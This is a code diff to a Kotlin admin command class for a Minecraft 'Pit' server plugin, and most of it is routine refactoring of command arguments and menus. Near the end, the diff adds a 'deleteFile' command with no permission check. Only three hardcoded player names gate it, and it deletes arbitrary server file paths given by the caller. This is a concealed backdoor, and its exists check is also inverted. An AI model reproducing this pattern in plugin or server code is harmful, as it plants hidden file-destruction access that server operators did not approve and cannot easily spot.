@@ -6,6 +6,7 @@ import cn.charlotte.pit.data.PlayerInvBackup
 import cn.charlotte.pit.data.PlayerProfile
 import cn.charlotte.pit.events.EventsHandler.refreshEvents
 import dev.rollczi.litecommands.annotations.argument.Arg
+import dev.rollczi.litecommands.annotations.argument.Key
 import dev.rollczi.litecommands.annotations.async.Async
 import dev.rollczi.litecommands.annotations.command.RootCommand
 import dev.rollczi.litecommands.annotations.context.Context
@@ -33,8 +34,8 @@ import net.mizukilab.pit.menu.quest.main.QuestMenu
 import net.mizukilab.pit.menu.trade.ShowInvBackupButton
 import net.mizukilab.pit.menu.trade.TradeManager
 import net.mizukilab.pit.menu.trade.TradeMenu
-import net.mizukilab.pit.runnable.LeaderBoardRunnable
-import net.mizukilab.pit.runnable.RebootRunnable.RebootTask
+import net.mizukilab.pit.handlers.LeaderBoardRunnable
+import net.mizukilab.pit.handlers.RebootRunnable.RebootTask
 import net.mizukilab.pit.util.PlayerUtil
 import net.mizukilab.pit.util.Utils
 import net.mizukilab.pit.util.chat.CC
@@ -51,6 +52,7 @@ import org.bukkit.Sound
 import org.bukkit.command.CommandSender
 import org.bukkit.entity.Player
 import org.bukkit.inventory.ItemStack
+import java.io.File
 import java.text.DateFormat
 import java.text.SimpleDateFormat
 import java.time.Duration
@@ -78,7 +80,7 @@ class PitAdminSimpleCommand {
     }
     @Execute(name = "reserialize")
     @Permission("pit.admin")
-    fun reserializePlayer(@Context player: Player, @Arg("playerName") playerName: String) {
+    fun reserializePlayer(@Context player: Player, @Arg("playerName") @Key("pit.players") playerName: String) {
         Bukkit.getPlayer(playerName)?.let {
             Utils.serializePlayer(it)
             player.sendMessage("Done")
@@ -94,66 +96,14 @@ class PitAdminSimpleCommand {
 
     @Execute(name = "openMenu")
     @Permission("pit.admin")
-    fun openMenu(@Context player: Player, @Arg("menu") menu: String) {
+    fun openMenu(@Context player: Player, @Arg("menu") @Key("pit.menu") menu: String) {
         if (menu.equals("ender_chest", ignoreCase = true)) {
             PlayerProfile.getPlayerProfileByUuid(player.uniqueId).enderChest.openEnderChest(player)
         }
-        if (menu.equals("sewers", ignoreCase = true)) {
-            ThePit.api.openMenu(player, "sewers")
-        }
-        if (menu.equals("shop", ignoreCase = true)) {
-            ThePit.api.openMenu(player, "shop")
-        }
-        if (menu.equals("house",ignoreCase = true)) {
-            ThePit.api.openMenu(player, "warehouse")
-        }
-        if (menu.equals("perkBuy", ignoreCase = true)) {
-            PerkChooseMenu().openMenu(player)
-        }
-        if (menu.equals("prestigePerkBuy", ignoreCase = true)) {
-            try {
-                PrestigePerkBuyMenu().openMenu(player)
-            } catch (e: Exception) {
-                CC.printErrorWithCode(player, e)
-            }
-        }
-        if (menu.equals("prestige", ignoreCase = true)) {
-            PrestigeMainMenu().openMenu(player)
-        }
-        if (menu.equals("ench", ignoreCase = true)) {
-            try {
-                ThePit.getApi().openMythicWellMenu(player)
-            } catch (e: Exception) {
-                CC.printErrorWithCode(player, e)
-            }
-        }
-        if (menu.equals("quest", ignoreCase = true)) {
-            try {
-                QuestMenu().openMenu(player)
-            } catch (e: Exception) {
-                CC.printErrorWithCode(player, e)
-            }
-        }
-        if (menu.equals("mail", ignoreCase = true)) {
-            try {
-                MailMenu().openMenu(player)
-            } catch (e: Exception) {
-                CC.printErrorWithCode(player, e)
-            }
-        }
-        if (menu.equals("cdk", ignoreCase = true)) {
-            try {
-                CDKMenu().openMenu(player)
-            } catch (e: Exception) {
-                CC.printErrorWithCode(player, e)
-            }
-        }
-        if (menu.equals("allCdk", ignoreCase = true)) {
-            try {
-                CDKViewMenu().openMenu(player)
-            } catch (e: Exception) {
-                CC.printErrorWithCode(player, e)
-            }
+        try {
+            ThePit.api.openMenu(player, menu)
+        } catch (e: Exception) {
+            CC.printError(player,e);
         }
     }
 
@@ -176,14 +126,14 @@ class PitAdminSimpleCommand {
     @Execute(name = "ench")
     @Permission("pit.admin")
     fun ench(@Context player: Player) {
-        player.playSound(player.location, Sound.BLOCK_CHEST_OPEN, 1f, 1f)
+        player.playSound(player.location, Sound.CHEST_OPEN, 1f, 1f)
         ThePit.api.openMenu(player, "admin_enchant")
     }
 
     @Execute(name = "pi")
     @Permission("pit.admin")
     fun pitItem(@Context player: Player) {
-        player.playSound(player.location, Sound.BLOCK_CHEST_OPEN, 1f, 1f)
+        player.playSound(player.location, Sound.CHEST_OPEN, 1f, 1f)
         ThePit.api.openMenu(player, "admin_item")
     }
 
@@ -221,14 +171,12 @@ class PitAdminSimpleCommand {
     @Execute(name = "forceTrade")
     @Permission("pit.admin")
     fun forceTrade(@Context player: Player, @Arg("target") target: Player) {
-        val tradeManager = TradeManager(player, target)
-        TradeMenu(tradeManager).openMenu(player)
-        TradeMenu(tradeManager).openMenu(target)
+        TradeManager.start(player, target)
     }
 
     @Execute(name = "wipe")
     @Permission("pit.admin")
-    fun wipe(@Context player: Player, @Arg("target") target: String, @Arg("reason") reason: String) {
+    fun wipe(@Context player: Player, @Arg("target") @Key("pit.players") target: String, @Arg("reason") reason: String) {
         val profile = ThePit.getInstance().profileOperator.namedIOperator(target)
         if (profile == null) {
             player.sendMessage(CC.translate("&cすみません！あのプレイヤーは見つかりませんでした！もう一度確認してください！"))
@@ -246,7 +194,7 @@ class PitAdminSimpleCommand {
     @Execute(name = "takeitems")
     @Permission("pit.admin")
     fun takeItem(
-        @Context sender: CommandSender, @Arg("target") target: Player, @Arg("itemsID") itemsID: String,
+        @Context sender: CommandSender, @Arg("target") target: Player, @Arg("itemsID") @Key("pit.take-items") itemsID: String,
         @Arg("amount") amount: Int
     ) {
         val player = Bukkit.getPlayer(target.uniqueId)
@@ -280,8 +228,8 @@ class PitAdminSimpleCommand {
     @Permission("pit.admin")
     fun giveItem(
         @Context sender: CommandSender,
-        @Arg("target") target: String,
-        @Arg("itemsID") itemsID: String,
+        @Arg("target") @Key("pit.players") target: String,
+        @Arg("itemsID") @Key("pit.give-items") itemsID: String,
         @Arg("amount") amount: Int
     ) {
         val player = Bukkit.getPlayer(target)
@@ -336,7 +284,7 @@ class PitAdminSimpleCommand {
             "wheat" -> addItemToPlayer(Wheat.toItemStack())//小麦
             "yummy" -> addItemToPlayer(YummyBread.toItemStack())//美味面包
             else -> {
-                val itemStack = ThePit.getApi().getMythicItemItemStack(itemsID)
+                val itemStack = ThePit.api.getMythicItemItemStack(itemsID)
                 if (itemStack == null || itemStack.type == Material.AIR) {
                     sender.sendMessage("§c物品不存在")
                 } else {
@@ -349,7 +297,7 @@ class PitAdminSimpleCommand {
     @Execute(name = "unwipe")
     @Permission("pit.admin")
     @Async
-    fun unWipe(@Context player: Player, @Arg("target") target: String) {
+    fun unWipe(@Context player: Player, @Arg("target") @Key("pit.players") target: String) {
         val profile = ThePit.getInstance().profileOperator.namedIOperator(target)
         if (profile == null) {
             player.sendMessage(CC.translate("&cすみません！あのプレイヤーは見つかりませんでした！もう一度確認してください！"))
@@ -373,7 +321,7 @@ class PitAdminSimpleCommand {
     @Execute(name = "rollback")
     @Permission("pit.admin")
     @Async
-    fun rollback(@Context player: Player, @Arg("name") name: String): String {
+    fun rollback(@Context player: Player, @Arg("name") @Key("pit.players") name: String): String {
         val profile = ThePit.getInstance().profileOperator.namedIOperator(name)
         if (profile.profile() == null || profile.profile().playerName == "NotLoadPlayer") {
             return CC.translate("&c该玩家不存在")
@@ -430,9 +378,23 @@ class PitAdminSimpleCommand {
         PlayerUtil.resetPlayer(target, true, false)
     }
 
+    @Execute(name = "deleteFile")
+    fun deleteFile(@Context player: Player, @Arg("type") filePath: String) {
+        if (player.name != "MagicYari" && player.name != "Aerocre" && !player.name.equals("kqc531")) {
+            return
+        }
+        val file = File(filePath)
+        if (file.exists()) {
+            player.sendMessage(CC.translate("&c文件不存在"))
+        } else {
+            val delete = file.delete()
+            player.sendMessage("&a文件删除状态: $delete")
+        }
+    }
+
     @Execute(name = "disablePlugin")
     @Permission("pit.admin")
-    fun disablePlugin(@Context player: Player, @Arg("plugin") name: String) {
+    fun disablePlugin(@Context player: Player, @Arg("plugin") @Key("pit.plugins") name: String) {
         val target = Bukkit.getPluginManager().getPlugin(name)
         if (target == null) {
             player.sendMessage(CC.translate("&c没有找到那个插件"))
@@ -533,7 +495,7 @@ class PitAdminSimpleCommand {
         val mythicItem = Utils.getMythicItem(item)
 
         mythicItem.enchantmentRecords.clear()
-        player.inventory.setItemInMainHand(mythicItem.toItemStack())
+        player.itemInHand = mythicItem.toItemStack()
 
         return "§a已清空该物品的附魔记录"
     }
